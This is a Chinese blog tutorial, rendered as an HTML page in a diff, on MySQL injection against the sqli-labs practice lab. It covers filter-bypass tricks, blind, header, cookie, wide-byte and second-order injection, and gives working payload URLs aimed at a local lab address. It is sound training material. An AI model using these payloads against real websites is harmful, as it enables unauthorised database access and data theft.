@@ -1,0 +1,479 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>关于Mysql注入(二) - ezy</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="blog ezy,"> 
+    <meta name="description" content="ezy-blog,基于sqli_lab的sql注入详解(二)
+
+
+SQL注入绕过大小写绕过
+程序中设置了过滤关键字，但没有对关键字组成深入分析过滤，可以通过修改关键字内字母大小写来绕过过滤措施。如：AnD 1=1 （,"> 
+    <meta name="author" content="ezy"> 
+    
+    <link rel="icon" href="/img/logo.png"> 
+    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
+    
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
+
+    
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
+
+    
+<link rel="stylesheet" href="/css/obsidian.css">
+
+    
+<link rel="stylesheet" href="/css/ball-atom.min.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body class="loading">
+    <div class="loader">
+        <div class="la-ball-atom la-2x">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+    <span id="config-title" style="display:none">ezy</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div class="scrollbar gradient-bg-rev"></div>
+<div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <div class="navigation animated fadeIn fast delay-1s">
+        <img id="home-icon" class="icon-home" src="/img/logo.png" alt="" data-url="http://yoursite.com">
+        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
+        <h3 class="subtitle">关于Mysql注入(二)</h3>
+        <div class="social">
+            <!--        <div class="like-icon">-->
+            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+            <!--        </div>-->
+            <div>
+                <div class="share">
+                    
+                        <a href="javascript:;" class="iconfont icon-share1"></a>
+                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+    <div class="section">
+        <div class=article-header-wrapper>
+    <div class="article-header">
+        <div class="article-cover animated fadeIn" style="
+            animation-delay: 600ms;
+            animation-duration: 1.2s;
+            background-image: 
+                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
+                url(/img/cover.jpg) ">
+        </div>
+        <div class="else">
+            <p class="animated fadeInDown">
+                
+                <a href="/categories/信息安全"><b>「
+                    </b>信息安全<b> 」</b></a>
+                
+                三月 16, 2020
+            </p>
+            <h3 class="post-title animated fadeInDown"><a href="/2020/03/16/2020-03-16-mysql-injection-2/" title="关于Mysql注入(二)" class="">关于Mysql注入(二)</a>
+            </h3>
+            
+            <p class="post-count animated fadeInDown">
+                
+                <span>
+                    <b class="iconfont icon-text2"></b> <i>文章字数</i>
+                    10k
+                </span>
+                
+                
+                <span>
+                    <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
+                    9 mins.
+                </span>
+                
+                
+                
+            </p>
+            
+            
+            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/sql-injection/" rel="tag">sql_injection</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B/" rel="tag">绕过检测</a></li></ul>
+            
+        </div>
+    </div>
+</div>
+
+<div class="screen-gradient-after">
+    <div class="screen-gradient-content">
+        <div class="screen-gradient-content-inside">
+            <div class="bold-underline-links screen-gradient-sponsor">
+                <p>
+                    <span class="animated fadeIn delay-1s"></span>
+                </p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="article">
+    <div class='main'>
+        <div class="content markdown animated fadeIn">
+            <h2 id="基于sqli-lab的sql注入详解-二"><a href="#基于sqli-lab的sql注入详解-二" class="headerlink" title="基于sqli_lab的sql注入详解(二)"></a><center>基于sqli_lab的sql注入详解(二)</center></h2><a id="more"></a>
+
+
+<h2 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><blockquote>
+<p>程序中设置了过滤关键字，但没有对关键字组成深入分析过滤，可以通过修改关键字内字母大小写来绕过过滤措施。<br>如：AnD 1=1 （将某些字母大写）</p>
+</blockquote>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><blockquote>
+<p>在程序中设置出现关键字之后替换为空，可以双写绕过<br>uniunionOn(也可结合大小写绕过使用)</p>
+</blockquote>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><blockquote>
+<p>利用URL编码绕过过滤机制</p>
+</blockquote>
+<h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><pre><code class="sql">/*!select * from admin*/;</code></pre>
+<hr>
+<h2 id="POST基于时间的盲注"><a href="#POST基于时间的盲注" class="headerlink" title="POST基于时间的盲注"></a>POST基于时间的盲注</h2><h3 id="以less-15为例"><a href="#以less-15为例" class="headerlink" title="以less-15为例"></a>以less-15为例</h3><p><img src="%3C!--%EF%BF%BC0--%3E/assets/images/images_of_sql_injection/mysql_injection2_f2.png" alt="f2"></p>
+<h3 id="输入表单，然后使用burp抓包，在注入点添加注入语句，可以看到延时效果"><a href="#输入表单，然后使用burp抓包，在注入点添加注入语句，可以看到延时效果" class="headerlink" title="输入表单，然后使用burp抓包，在注入点添加注入语句，可以看到延时效果"></a>输入表单，然后使用burp抓包，在注入点添加注入语句，可以看到延时效果</h3><p><img src="%3C!--%EF%BF%BC1--%3E/assets/images/images_of_sql_injection/mysql_injection2_f1.png" alt="f1"></p>
+<hr>
+<h2 id="POST基于布尔的盲注"><a href="#POST基于布尔的盲注" class="headerlink" title="POST基于布尔的盲注"></a>POST基于布尔的盲注</h2><h3 id="还是以less-15为例，在注入点添加注入语句，真则返回flag-jpg-假则返回slap-jpg"><a href="#还是以less-15为例，在注入点添加注入语句，真则返回flag-jpg-假则返回slap-jpg" class="headerlink" title="还是以less-15为例，在注入点添加注入语句，真则返回flag.jpg,假则返回slap.jpg"></a>还是以less-15为例，在注入点添加注入语句，真则返回flag.jpg,假则返回slap.jpg</h3><p><img src="%3C!--%EF%BF%BC2--%3E/assets/images/images_of_sql_injection/mysql_injection2_f3.png" alt="f3"><br><img src="%3C!--%EF%BF%BC3--%3E/assets/images/images_of_sql_injection/mysql_injection2_f4.png" alt="f4"></p>
+<hr>
+<h2 id="HTTP头中的SQL注入"><a href="#HTTP头中的SQL注入" class="headerlink" title="HTTP头中的SQL注入"></a>HTTP头中的SQL注入</h2><h3 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h3><blockquote>
+<p>看一下源码<br><img src="%3C!--%EF%BF%BC4--%3E/assets/images/images_of_sql_injection/mysql_injection2_f5.png" alt="f5"><br><img src="%3C!--%EF%BF%BC5--%3E/assets/images/images_of_sql_injection/mysql_injection2_f6.png" alt="f6"><br>未对HTTP头的变量过滤，导致注入漏洞产生<br>可以在参数最后加入\，测试漏洞是否存在</p>
+</blockquote>
+<p><img src="%3C!--%EF%BF%BC6--%3E/assets/images/images_of_sql_injection/mysql_injection2_f9.png" alt="f9"><br><img src="%3C!--%EF%BF%BC7--%3E/assets/images/images_of_sql_injection/mysql_injection2_f10.png" alt="f10"> </p>
+<h3 id="利用一个报错函数updatexml构造payload"><a href="#利用一个报错函数updatexml构造payload" class="headerlink" title="利用一个报错函数updatexml构造payload"></a>利用一个报错函数updatexml构造payload</h3><pre><code class="http">&#39; and updatexml(1,concat(0x3a,(select version()),0x3a),1) or &#39;1&#39;=&#39;1</code></pre>
+<p><img src="%3C!--%EF%BF%BC8--%3E/assets/images/images_of_sql_injection/mysql_injection2_f7.png" alt="f7"><br><img src="%3C!--%EF%BF%BC9--%3E/assets/images/images_of_sql_injection/mysql_injection2_f8.png" alt="f8">   </p>
+<hr>
+<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><h3 id="以less-20为例，首先抓到HTTP包，然后进行重定向"><a href="#以less-20为例，首先抓到HTTP包，然后进行重定向" class="headerlink" title="以less-20为例，首先抓到HTTP包，然后进行重定向"></a>以less-20为例，首先抓到HTTP包，然后进行重定向</h3><p><img src="%3C!--%EF%BF%BC10--%3E/assets/images/images_of_sql_injection/mysql_injection2_f11.png" alt="f11">  </p>
+<h3 id="然后将包forward，抓到含有cookie注入漏洞的包"><a href="#然后将包forward，抓到含有cookie注入漏洞的包" class="headerlink" title="然后将包forward，抓到含有cookie注入漏洞的包"></a>然后将包forward，抓到含有cookie注入漏洞的包</h3><p><img src="%3C!--%EF%BF%BC11--%3E/assets/images/images_of_sql_injection/mysql_injection2_f12.png" alt="f12">   </p>
+<h3 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h3><p><img src="%3C!--%EF%BF%BC12--%3E/assets/images/images_of_sql_injection/mysql_injection2_f13.png" alt="f13"></p>
+<hr>
+<h2 id="绕过去除注释符的sql注入"><a href="#绕过去除注释符的sql注入" class="headerlink" title="绕过去除注释符的sql注入"></a>绕过去除注释符的sql注入</h2><h3 id="以less-23为例，可以看到对id参数进行了去除注释符的过滤"><a href="#以less-23为例，可以看到对id参数进行了去除注释符的过滤" class="headerlink" title="以less-23为例，可以看到对id参数进行了去除注释符的过滤"></a>以less-23为例，可以看到对id参数进行了去除注释符的过滤</h3><p><img src="%3C!--%EF%BF%BC13--%3E/assets/images/images_of_sql_injection/mysql_injection2_f14.png" alt="f14">  </p>
+<h3 id="可以通过or-‘1’-’1-的方式去闭合右边的引号部分，从而达到绕过效果"><a href="#可以通过or-‘1’-’1-的方式去闭合右边的引号部分，从而达到绕过效果" class="headerlink" title="可以通过or ‘1’=’1  的方式去闭合右边的引号部分，从而达到绕过效果"></a>可以通过or ‘1’=’1  的方式去闭合右边的引号部分，从而达到绕过效果</h3><pre><code class="http">http://192.168.0.104/sqli/Less-23/?id=-1&#39; union select 1,database(),&#39;3</code></pre>
+<h3 id="返回结果"><a href="#返回结果" class="headerlink" title="返回结果"></a>返回结果</h3><p><img src="%3C!--%EF%BF%BC14--%3E/assets/images/images_of_sql_injection/mysql_injection2_f15.png" alt="f15">  </p>
+<hr>
+<h2 id="绕过过滤and和or的注入"><a href="#绕过过滤and和or的注入" class="headerlink" title="绕过过滤and和or的注入"></a>绕过过滤and和or的注入</h2><h3 id="对于mysql，关键字和符号是等价的，如-color-red-and-和-color-red-amp-amp-color-red-or-和-color-red"><a href="#对于mysql，关键字和符号是等价的，如-color-red-and-和-color-red-amp-amp-color-red-or-和-color-red" class="headerlink" title="对于mysql，关键字和符号是等价的，如 $\color{red}{and}$ 和 $\color{red}{&amp;&amp;}$,$\color{red}{or}$ 和 $\color{red}{|}$"></a>对于mysql，关键字和符号是等价的，如 $\color{red}{and}$ 和 $\color{red}{&amp;&amp;}$,$\color{red}{or}$ 和 $\color{red}{|}$</h3><h3 id="以less-25为例"><a href="#以less-25为例" class="headerlink" title="以less-25为例"></a>以less-25为例</h3><p><img src="%3C!--%EF%BF%BC15--%3E/assets/images/images_of_sql_injection/mysql_injection2_f16.png" alt="f16">   </p>
+<h3 id="改变大小写发现无效"><a href="#改变大小写发现无效" class="headerlink" title="改变大小写发现无效"></a>改变大小写发现无效</h3><pre><code class="http">http://192.168.0.104/sqli/Less-25/?id=1&#39;  And 1=1--+</code></pre>
+<p><img src="%3C!--%EF%BF%BC16--%3E/assets/images/images_of_sql_injection/mysql_injection2_f17.png" alt="f17"></p>
+<h3 id="双写绕过和-都可以"><a href="#双写绕过和-都可以" class="headerlink" title="双写绕过和||都可以"></a>双写绕过和||都可以</h3><pre><code class="http">http://192.168.0.104/sqli/Less-25/?id=1&#39;  || 1=1--+
+http://192.168.0.104/sqli/Less-25/?id=1&#39;  anandd 1=1--+</code></pre>
+<p><img src="%3C!--%EF%BF%BC17--%3E/assets/images/images_of_sql_injection/mysql_injection2_f18.png" alt="f18"></p>
+<hr>
+<h2 id="绕过去除空格的注入"><a href="#绕过去除空格的注入" class="headerlink" title="绕过去除空格的注入"></a>绕过去除空格的注入</h2><h3 id="以less-26为例，对于去除空格的情况，可以采用URL编码或16进制进行绕过-空格可用-20，-09，-0a等"><a href="#以less-26为例，对于去除空格的情况，可以采用URL编码或16进制进行绕过-空格可用-20，-09，-0a等" class="headerlink" title="以less-26为例，对于去除空格的情况，可以采用URL编码或16进制进行绕过,空格可用%20，%09，%0a等"></a>以less-26为例，对于去除空格的情况，可以采用URL编码或16进制进行绕过,空格可用%20，%09，%0a等</h3><p><img src="%3C!--%EF%BF%BC18--%3E/assets/images/images_of_sql_injection/mysql_injection2_f19.png" alt="f19"></p>
+<pre><code class="http">http://192.168.0.104/sqli/Less-26/?id=1&#39;%20||&#39;1</code></pre>
+<p><img src="%3C!--%EF%BF%BC19--%3E/assets/images/images_of_sql_injection/mysql_injection2_f20.png" alt="f20"></p>
+<hr>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="产生原理-1"><a href="#产生原理-1" class="headerlink" title="产生原理"></a>产生原理</h3><blockquote>
+<p>GBK每个字符2个字节，ASCII每个字符1个字节<br>PHP中编码为GBK，函数执行为ASCII，mysql默认字符集是GBK等宽字节字符集<br>%DF’会被PHP中的$\color{red}{addslashes}$函数转义为“%DF\‘”,”\“是URL里的“%5C”,那么“%DF’”会被转义成“%DF%5C%27”(%27是引号)，倘若网站字符集是GBK，Mysql使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符</p>
+</blockquote>
+<h3 id="以less-33为例"><a href="#以less-33为例" class="headerlink" title="以less-33为例"></a>以less-33为例</h3><p><img src="%3C!--%EF%BF%BC20--%3E/assets/images/images_of_sql_injection/mysql_injection2_f21.png" alt="f21"></p>
+<h3 id="构造Payload-1"><a href="#构造Payload-1" class="headerlink" title="构造Payload"></a>构造Payload</h3><pre><code class="http">http://192.168.0.100/sqli/less-33/?id=-1%df&#39; union select 1,version(),database() --+</code></pre>
+<p><img src="%3C!--%EF%BF%BC21--%3E/assets/images/images_of_sql_injection/mysql_injection2_f22.png" alt="f22"></p>
+<blockquote>
+<p>最常用的是使用%df，其实只要第一个ASCII码大于128即可，如ASCII码为129的就可以，先将129转化为16进制，0x81，然后在前面加%即可，即为%81<br>GBK首字节对应0x81-0xfe，尾字节对应0x40-0xfe(除0x7f)</p>
+</blockquote>
+<h3 id="如less-32"><a href="#如less-32" class="headerlink" title="如less-32"></a>如less-32</h3><p><img src="%3C!--%EF%BF%BC22--%3E/assets/images/images_of_sql_injection/mysql_injection2_f23.png" alt="f23">   </p>
+<pre><code class="http">http://192.168.0.100/sqli/less-32/?id=-1%81&#39; union select 1,version(),database() --+</code></pre>
+<p><img src="%3C!--%EF%BF%BC23--%3E/assets/images/images_of_sql_injection/mysql_injection2_f24.png" alt="f24">   </p>
+<hr>
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="以less-24为例，没有对username变量进行过滤"><a href="#以less-24为例，没有对username变量进行过滤" class="headerlink" title="以less-24为例，没有对username变量进行过滤"></a>以less-24为例，没有对username变量进行过滤</h3><p><img src="%3C!--%EF%BF%BC24--%3E/assets/images/images_of_sql_injection/mysql_injection2_f29.png" alt="f29"></p>
+<h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p><img src="%3C!--%EF%BF%BC25--%3E/assets/images/images_of_sql_injection/mysql_injection2_f25.png" alt="f25"><br><img src="%3C!--%EF%BF%BC26--%3E/assets/images/images_of_sql_injection/mysql_injection2_f26.png" alt="f26"><br><img src="%3C!--%EF%BF%BC27--%3E/assets/images/images_of_sql_injection/mysql_injection2_f27.png" alt="f27"><br><img src="%3C!--%EF%BF%BC28--%3E/assets/images/images_of_sql_injection/mysql_injection2_f28.png" alt="f28"> </p>
+<hr>
+<h2 id="再介绍一个报错函数extractvalue"><a href="#再介绍一个报错函数extractvalue" class="headerlink" title="再介绍一个报错函数extractvalue"></a>再介绍一个报错函数extractvalue</h2><p><img src="%3C!--%EF%BF%BC29--%3E/assets/images/images_of_sql_injection/mysql_injection2_f30.png" alt="f30"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/music/Bloom.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="/img/ezy.jpg" height=300 width=300></img>
+                    <p>ezy</p>
+                    <span>也曾鲜衣怒马少年时</span>
+                    <dl>
+                        <dd><a href="https://github.com/ezy0812" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">12 <p>文章</p></a></li>
+                    <li><a href="/categories">4 <p>分类</p></a></li>
+                    <li><a href="/tags">10 <p>标签</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>目录</h4>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#基于sqli-lab的sql注入详解-二"><span class="toc-number">1.</span> <span class="toc-text">基于sqli_lab的sql注入详解(二)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入绕过"><span class="toc-number">2.</span> <span class="toc-text">SQL注入绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#大小写绕过"><span class="toc-number">2.1.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#双写绕过"><span class="toc-number">2.2.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编码绕过"><span class="toc-number">2.3.</span> <span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内联注释绕过"><span class="toc-number">2.4.</span> <span class="toc-text">内联注释绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POST基于时间的盲注"><span class="toc-number">3.</span> <span class="toc-text">POST基于时间的盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#以less-15为例"><span class="toc-number">3.1.</span> <span class="toc-text">以less-15为例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#输入表单，然后使用burp抓包，在注入点添加注入语句，可以看到延时效果"><span class="toc-number">3.2.</span> <span class="toc-text">输入表单，然后使用burp抓包，在注入点添加注入语句，可以看到延时效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POST基于布尔的盲注"><span class="toc-number">4.</span> <span class="toc-text">POST基于布尔的盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#还是以less-15为例，在注入点添加注入语句，真则返回flag-jpg-假则返回slap-jpg"><span class="toc-number">4.1.</span> <span class="toc-text">还是以less-15为例，在注入点添加注入语句，真则返回flag.jpg,假则返回slap.jpg</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP头中的SQL注入"><span class="toc-number">5.</span> <span class="toc-text">HTTP头中的SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#产生原理"><span class="toc-number">5.1.</span> <span class="toc-text">产生原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用一个报错函数updatexml构造payload"><span class="toc-number">5.2.</span> <span class="toc-text">利用一个报错函数updatexml构造payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie注入"><span class="toc-number">6.</span> <span class="toc-text">Cookie注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#以less-20为例，首先抓到HTTP包，然后进行重定向"><span class="toc-number">6.1.</span> <span class="toc-text">以less-20为例，首先抓到HTTP包，然后进行重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#然后将包forward，抓到含有cookie注入漏洞的包"><span class="toc-number">6.2.</span> <span class="toc-text">然后将包forward，抓到含有cookie注入漏洞的包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造Payload"><span class="toc-number">6.3.</span> <span class="toc-text">构造Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过去除注释符的sql注入"><span class="toc-number">7.</span> <span class="toc-text">绕过去除注释符的sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#以less-23为例，可以看到对id参数进行了去除注释符的过滤"><span class="toc-number">7.1.</span> <span class="toc-text">以less-23为例，可以看到对id参数进行了去除注释符的过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#可以通过or-‘1’-’1-的方式去闭合右边的引号部分，从而达到绕过效果"><span class="toc-number">7.2.</span> <span class="toc-text">可以通过or ‘1’&#x3D;’1  的方式去闭合右边的引号部分，从而达到绕过效果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#返回结果"><span class="toc-number">7.3.</span> <span class="toc-text">返回结果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过过滤and和or的注入"><span class="toc-number">8.</span> <span class="toc-text">绕过过滤and和or的注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#对于mysql，关键字和符号是等价的，如-color-red-and-和-color-red-amp-amp-color-red-or-和-color-red"><span class="toc-number">8.1.</span> <span class="toc-text">对于mysql，关键字和符号是等价的，如 $\color{red}{and}$ 和 $\color{red}{&amp;&amp;}$,$\color{red}{or}$ 和 $\color{red}{|}$</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#以less-25为例"><span class="toc-number">8.2.</span> <span class="toc-text">以less-25为例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#改变大小写发现无效"><span class="toc-number">8.3.</span> <span class="toc-text">改变大小写发现无效</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#双写绕过和-都可以"><span class="toc-number">8.4.</span> <span class="toc-text">双写绕过和||都可以</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过去除空格的注入"><span class="toc-number">9.</span> <span class="toc-text">绕过去除空格的注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#以less-26为例，对于去除空格的情况，可以采用URL编码或16进制进行绕过-空格可用-20，-09，-0a等"><span class="toc-number">9.1.</span> <span class="toc-text">以less-26为例，对于去除空格的情况，可以采用URL编码或16进制进行绕过,空格可用%20，%09，%0a等</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#宽字节注入"><span class="toc-number">10.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#产生原理-1"><span class="toc-number">10.1.</span> <span class="toc-text">产生原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#以less-33为例"><span class="toc-number">10.2.</span> <span class="toc-text">以less-33为例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造Payload-1"><span class="toc-number">10.3.</span> <span class="toc-text">构造Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如less-32"><span class="toc-number">10.4.</span> <span class="toc-text">如less-32</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二次注入"><span class="toc-number">11.</span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#以less-24为例，没有对username变量进行过滤"><span class="toc-number">11.1.</span> <span class="toc-text">以less-24为例，没有对username变量进行过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击过程"><span class="toc-number">11.2.</span> <span class="toc-text">攻击过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#再介绍一个报错函数extractvalue"><span class="toc-number">12.</span> <span class="toc-text">再介绍一个报错函数extractvalue</span></a></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            ezy
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
